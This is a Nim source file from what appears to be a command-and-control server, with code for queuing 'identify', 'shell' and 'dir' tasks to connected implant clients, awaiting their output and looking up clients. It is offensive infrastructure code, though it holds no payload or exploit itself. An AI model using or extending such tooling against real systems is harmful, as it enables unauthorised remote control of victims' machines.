import std/[asyncdispatch, tables]

import types, logging, events

let id_s: Table[string, int] = {
  "identify": 0,
  "shell": 7,

  "dir": 100
}.toTable

proc sendClientTask*(client: C2Client, taskName: string, arguments: seq[string] = @[]): Future[Task] {.async.} =
  if not client.connected:
    errorLog "can't send task to disconnected client: " & $client
    return

  let task_id: int = id_s[taskName]

  let createdTask = Task(
    client: client,
    id: len(client.server.tasks),
    action: task_id,
    actionName: taskName,
    status: TaskCreated,
    arguments: arguments,
    future: new (ref Future[void]),
    output: TaskOutput()
  )

  client.server.tasks.add(createdTask)
  
  onClientTasked(client, createdTask)
  return createdTask


proc awaitResponse*(task: Task): Future[void] =
  task.client.server.cli.waitingForOutput = true
  if task.future[].isNil():
    task.future[] = newFuture[void]()
  return task.future[]

proc askToIdentify*(client: C2Client) {.async.} =
  discard await client.sendClientTask("identify")

proc getClientByHash*(server: C2Server, hash: string): C2Client =
  for client in server.clients: 
    if client.hash == hash: return client

proc getClientById*(server: C2Server, id: string): C2Client =
  for client in server.clients: 
    if client.id == id: return client